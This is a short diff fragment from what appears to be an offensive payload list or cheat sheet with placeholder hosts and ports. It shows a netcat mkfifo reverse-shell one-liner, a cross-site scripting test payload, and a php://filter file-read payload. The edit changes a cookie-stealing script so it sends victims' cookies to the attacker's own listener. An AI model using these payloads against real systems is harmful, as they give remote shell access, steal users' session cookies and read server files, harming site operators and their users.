@@ -124,7 +124,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
 
 <script>alert(document.cookie)</script>
 
-<script>document.location='http://{rhost}/?cookie='+document.cookie</script>
+<script>document.location='http://{lhost}:{lport}/?cookie='+document.cookie</script>
 
 php://filter/convert.base64-encode/resource=index
 
